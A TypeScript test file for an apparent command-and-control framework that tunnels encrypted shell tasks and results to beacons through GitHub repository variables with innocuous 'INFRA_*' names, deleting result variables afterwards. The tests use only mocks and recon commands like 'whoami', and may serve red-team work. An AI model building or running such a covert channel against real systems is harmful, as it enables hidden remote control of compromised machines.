import { describe, it, expect, mock, beforeEach } from "bun:test";
import { ActionsChannel } from "../channels/ActionsChannel.ts";
import { BeaconRegistry } from "../BeaconRegistry.ts";
import { TaskQueue } from "../TaskQueue.ts";
import {
  generateOperatorKeyPair, bytesToBase64, sealBox, encryptForBeacon,
} from "../crypto/sodium.ts";

// ── Octokit mock factory ──────────────────────────────────────────────────────

function makeOctokit(actionsOverrides: Record<string, any> = {}) {
  return {
    rest: {
      actions: {
        listRepoVariables:    mock(async () => ({ data: { variables: [] } })),
        getRepoVariable:      mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
        createRepoVariable:   mock(async () => ({})),
        updateRepoVariable:   mock(async () => ({})),
        deleteRepoVariable:   mock(async () => ({})),
        ...actionsOverrides,
      },
    },
  } as any;
}

// ── Test suite ────────────────────────────────────────────────────────────────

describe("ActionsChannel", () => {
  let registry: BeaconRegistry;
  let queue: TaskQueue;
  let operatorKp: { publicKey: Uint8Array; secretKey: Uint8Array };

  beforeEach(async () => {
    registry   = new BeaconRegistry("/tmp/actions-channel-test-registry");
    queue      = new TaskQueue();
    operatorKp = await generateOperatorKeyPair();
  });

  it("start() and stop() do not throw", async () => {
    const ch = new ActionsChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs:    60_000,
      octokit:           makeOctokit(),
    });
    ch.start();
    ch.stop();
  });

  // ── ACK variable scanning ─────────────────────────────────────────────────

  it("processAckVariables registers beacon from INFRA_STATUS_* variable", async () => {
    const beaconKp  = await generateOperatorKeyPair();
    const beaconId  = "abcd1234-bbbb-cccc-dddd-eeeeeeeeeeee";
    const id8       = beaconId.slice(0, 8);
    const pubB64    = await bytesToBase64(beaconKp.publicKey);

    const ackVarName = `INFRA_STATUS_${id8}`;
    const ackValue   = JSON.stringify({ k: pubB64, t: new Date().toISOString() });

    const octokit = makeOctokit({
      listRepoVariables: mock(async () => ({
        data: { variables: [{ name: ackVarName, value: ackValue }] },
      })),
    });

    const ch = new ActionsChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs:    60_000,
      octokit,
    });

    await (ch as any).poll();

    // Beacon should be registered; registry looks up by id8 prefix since full id unknown
    const allBeacons = registry.getAll();
    expect(allBeacons.length).toBeGreaterThanOrEqual(1);
    const found = allBeacons.find(b => b.publicKey === pubB64);
    expect(found).not.toBeUndefined();
  });

  it("does not re-process the same ACK variable on repeated polls", async () => {
    const beaconKp  = await generateOperatorKeyPair();
    const id8       = "aabbccdd";
    const pubB64    = await bytesToBase64(beaconKp.publicKey);

    const ackVarName = `INFRA_STATUS_${id8}`;
    const ackValue   = JSON.stringify({ k: pubB64, t: new Date().toISOString() });

    const listMock = mock(async () => ({
      data: { variables: [{ name: ackVarName, value: ackValue }] },
    }));

    const ch = new ActionsChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs:    60_000,
      octokit: makeOctokit({ listRepoVariables: listMock }),
    });

    await (ch as any).poll();
    const countAfterFirst = registry.getAll().length;

    await (ch as any).poll();
    // No new registrations on second poll of same ACK
    expect(registry.getAll().length).toBe(countAfterFirst);
  });

  // ── Task delivery ─────────────────────────────────────────────────────────

  it("deliverPendingTasks writes INFRA_JOB_* variable with encrypted tasks", async () => {
    const beaconKp  = await generateOperatorKeyPair();
    const beaconId  = "bbbb1234-bbbb-cccc-dddd-eeeeeeeeeeee";
    const id8       = beaconId.slice(0, 8);
    const pubB64    = await bytesToBase64(beaconKp.publicKey);

    registry.register({
      beaconId, issueNumber: 0, publicKey: pubB64,
      hostname: "host", username: "user", os: "linux", arch: "x64", seq: 0,
    });
    queue.queueTask(beaconId, "shell", { cmd: "whoami" });

    const updateVar = mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); });
    const createVar = mock(async () => ({}));

    const ch = new ActionsChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs:    60_000,
      octokit: makeOctokit({
        listRepoVariables: mock(async () => ({ data: { variables: [] } })),
        updateRepoVariable: updateVar,
        createRepoVariable: createVar,
      }),
    });

    // Prime the actionsBeacons map so the channel knows this beacon is active
    (ch as any).actionsBeacons.set(id8, beaconId);

    await (ch as any).poll();

    // A TASK variable should have been created
    expect(createVar.mock.calls.length).toBeGreaterThan(0);
    const createCall = (createVar.mock.calls[0] as any)[0] as any;
    expect((createCall.name as string)).toMatch(/^INFRA_JOB_/);
    expect((createCall.name as string)).toContain(id8);

    // The variable value should be a JSON encrypted envelope
    const envelope = JSON.parse(createCall.value);
    expect(envelope).toHaveProperty("nonce");
    expect(envelope).toHaveProperty("ciphertext");
  });

  it("deliverPendingTasks marks tasks as delivered after writing variable", async () => {
    const beaconKp  = await generateOperatorKeyPair();
    const beaconId  = "cccc5678-bbbb-cccc-dddd-eeeeeeeeeeee";
    const id8       = beaconId.slice(0, 8);
    const pubB64    = await bytesToBase64(beaconKp.publicKey);

    registry.register({
      beaconId, issueNumber: 0, publicKey: pubB64,
      hostname: "h", username: "u", os: "linux", arch: "x64", seq: 0,
    });
    const task = queue.queueTask(beaconId, "shell", { cmd: "id" });
    expect(task.state).toBe("pending");

    const ch = new ActionsChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs:    60_000,
      octokit: makeOctokit({
        listRepoVariables: mock(async () => ({ data: { variables: [] } })),
        updateRepoVariable: mock(async () => ({})),
        createRepoVariable: mock(async () => ({})),
      }),
    });
    (ch as any).actionsBeacons.set(id8, beaconId);

    await (ch as any).deliverPendingTasks("owner", "repo");

    expect(queue.getTask(task.taskId)?.state).toBe("delivered");
  });

  // ── Result variable processing ────────────────────────────────────────────

  it("processResultVariables marks task completed and deletes result variable", async () => {
    const beaconId = "dddd9012-bbbb-cccc-dddd-eeeeeeeeeeee";
    const beaconKp = await generateOperatorKeyPair();

    registry.register({
      beaconId, issueNumber: 0, publicKey: await bytesToBase64(beaconKp.publicKey),
      hostname: "h", username: "u", os: "linux", arch: "x64", seq: 0,
    });
    const task = queue.queueTask(beaconId, "shell", { cmd: "id" });
    queue.markDelivered(task.taskId);

    const resultPayload = JSON.stringify({
      taskId: task.taskId, beaconId,
      success: true, output: "uid=0(root)", completedAt: new Date().toISOString(),
    });

    // operatorKp here serves as both the operator key pair for sealing
    const sealed    = await sealBox(resultPayload, operatorKp.publicKey);
    const taskId8   = task.taskId.slice(0, 8);
    const varName   = `INFRA_RESULT_${taskId8}`;

    const deleteVar = mock(async () => ({}));

    const ch = new ActionsChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs:    60_000,
      octokit: makeOctokit({
        listRepoVariables: mock(async () => ({
          data: { variables: [{ name: varName, value: sealed }] },
        })),
        deleteRepoVariable: deleteVar,
      }),
    });

    await (ch as any).poll();

    const completed = queue.getTask(task.taskId);
    expect(completed?.state).toBe("completed");
    expect(deleteVar.mock.calls.length).toBeGreaterThan(0);
    const deletedName = ((deleteVar.mock.calls[0] as any)[0] as any).name as string;
    expect(deletedName).toBe(varName);
  });

  it("processResultVariables does not re-process already-seen result variables", async () => {
    const beaconId = "eeee3456-bbbb-cccc-dddd-eeeeeeeeeeee";
    const beaconKp = await generateOperatorKeyPair();

    registry.register({
      beaconId, issueNumber: 0, publicKey: await bytesToBase64(beaconKp.publicKey),
      hostname: "h", username: "u", os: "linux", arch: "x64", seq: 0,
    });
    const task = queue.queueTask(beaconId, "shell", { cmd: "id" });
    queue.markDelivered(task.taskId);

    const resultPayload = JSON.stringify({
      taskId: task.taskId, beaconId,
      success: true, output: "ok", completedAt: new Date().toISOString(),
    });
    const sealed  = await sealBox(resultPayload, operatorKp.publicKey);
    const taskId8 = task.taskId.slice(0, 8);
    const varName = `INFRA_RESULT_${taskId8}`;

    const deleteVar = mock(async () => ({}));
    const listMock  = mock(async () => ({
      data: { variables: [{ name: varName, value: sealed }] },
    }));

    const ch = new ActionsChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs:    60_000,
      octokit: makeOctokit({
        listRepoVariables: listMock,
        deleteRepoVariable: deleteVar,
      }),
    });

    await (ch as any).poll();
    await (ch as any).poll();

    // markCompleted should only be called once (second poll skips seenResultId8s)
    expect(deleteVar.mock.calls.length).toBe(1);
  });

  it("processResultVariables gracefully ignores variables with invalid sealed data", async () => {
    const taskId8 = "baddata0";
    const varName = `INFRA_RESULT_${taskId8}`;

    const ch = new ActionsChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs:    60_000,
      octokit: makeOctokit({
        listRepoVariables: mock(async () => ({
          data: { variables: [{ name: varName, value: "not-valid-sealed-data" }] },
        })),
      }),
    });

    // Should not throw
    await expect((ch as any).poll()).resolves.toBeUndefined();
  });
});
